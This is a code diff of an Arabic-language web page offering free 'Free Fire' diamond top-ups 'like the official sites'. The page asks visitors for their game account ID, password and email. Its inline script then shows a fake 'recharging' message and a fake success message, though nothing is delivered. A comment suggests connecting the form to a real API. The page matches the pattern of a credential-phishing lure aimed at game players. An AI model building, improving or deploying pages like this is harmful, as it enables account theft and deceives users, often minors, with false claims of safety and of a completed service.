@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>شحن جواهر فري فاير</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap');
 
@@ -10,84 +11,111 @@
       font-family: 'Cairo', sans-serif;
       background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
       color: white;
-      text-align: center;
-      padding: 20px;
       margin: 0;
+      padding: 0;
     }
 
     .container {
       max-width: 420px;
-      margin: auto;
-      background: rgba(0, 0, 0, 0.7);
+      margin: 60px auto;
+      background: rgba(0, 0, 0, 0.75);
       border-radius: 20px;
-      padding: 25px;
-      box-shadow: 0 0 20px #00e5ff;
-      margin-top: 40px;
+      padding: 30px 25px;
+      box-shadow: 0 0 30px #00e5ff;
       animation: fadeIn 1.5s ease-in-out;
+      text-align: center;
     }
 
     h2 {
       color: #00e5ff;
-      margin-bottom: 10px;
+      margin-bottom: 15px;
+      font-size: 26px;
     }
 
     p {
-      margin-bottom: 20px;
       color: #ccc;
-    }
-
-    input, select, button {
-      width: 100%;
-      padding: 12px;
-      margin: 12px 0;
-      border: none;
-      border-radius: 10px;
-      font-size: 15px;
+      margin-bottom: 25px;
+      line-height: 1.7;
     }
 
     input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 12px;
       background: #1e1e1e;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    input:focus, select:focus {
+      box-shadow: 0 0 10px #00e5ff;
+    }
+
+    label {
+      display: block;
+      text-align: right;
+      margin: 12px 0 6px;
       color: #fff;
     }
 
     button {
       background-color: #00c853;
       color: white;
+      padding: 13px;
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
       font-weight: bold;
-      transition: 0.3s;
+      margin-top: 15px;
+      cursor: pointer;
+      transition: 0.4s ease;
+      box-shadow: 0 0 15px #00e67688;
     }
 
     button:hover {
       background-color: #00e676;
-      transform: scale(1.03);
+      transform: scale(1.05);
     }
 
     .message {
-      margin-top: 25px;
-      color: #0ff;
+      margin-top: 20px;
+      color: #00e5ff;
+      font-size: 16px;
       font-weight: bold;
+      animation: pulse 1.5s infinite;
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-20px);}
+      from { opacity: 0; transform: translateY(20px);}
       to { opacity: 1; transform: translateY(0);}
+    }
+
+    @keyframes pulse {
+      0% {opacity: 1;}
+      50% {opacity: 0.6;}
+      100% {opacity: 1;}
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h2>🚀 أهلاً بك عزيزي المستخدم!</h2>
-    <p>نوفر لك خدمة شحن جواهر فري فاير مثل المواقع الرسمية 🔐</p>
+    <h2>🎯 شحن جواهر فري فاير</h2>
+    <p>مرحبًا بك! 🥳<br>نوفر لك شحن آمن وسريع لجواهر فري فاير 🔐 مثل المواقع الرسمية ✔️</p>
 
-    <input type="text" id="uid" placeholder="👤 أدخل ID الحساب" required>
-    <input type="password" id="password" placeholder="🔐 كلمة السر" required>
+    <input type="text" id="uid" placeholder="🎮 أدخل ID الحساب" required>
+    <input type="password" id="password" placeholder="🔐 كلمة المرور" required>
     <input type="email" id="email" placeholder="📧 البريد الإلكتروني" required>
 
     <label for="diamonds">💎 اختر عدد الجواهر:</label>
     <select id="diamonds">
-      <option value="100">100 جوهرة</option>
       <option value="50">50 جوهرة</option>
+      <option value="100">100 جوهرة</option>
       <option value="200">200 جوهرة</option>
       <option value="300">300 جوهرة</option>
       <option value="500">500 جوهرة</option>
@@ -95,10 +123,29 @@
       <option value="5600">5600 جوهرة</option>
     </select>
 
-    <button onclick="startRecharge()">🚀 بدء شحن الآن</button>
+    <button onclick="startRecharge()">🚀 بدء الشحن الآن</button>
     <div class="message" id="statusMessage"></div>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    function startRecharge() {
+      const uid = document.getElementById('uid').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const diamonds = document.getElementById('diamonds').value;
+
+      if (!uid || !password || !email) {
+        document.getElementById('statusMessage').textContent = "⚠️ الرجاء ملء جميع الحقول!";
+        return;
+      }
+
+      document.getElementById('statusMessage').textContent = `🔄 جاري شحن ${diamonds} جوهرة إلى حساب ${uid}... الرجاء الانتظار ⏳`;
+      
+      // بإمكانك هنا ربطها بـ API حقيقي إن أردت
+      setTimeout(() => {
+        document.getElementById('statusMessage').textContent = `✅ تم شحن ${diamonds} جوهرة بنجاح 🎉`;
+      }, 2500);
+    }
+  </script>
 </body>
 </html>
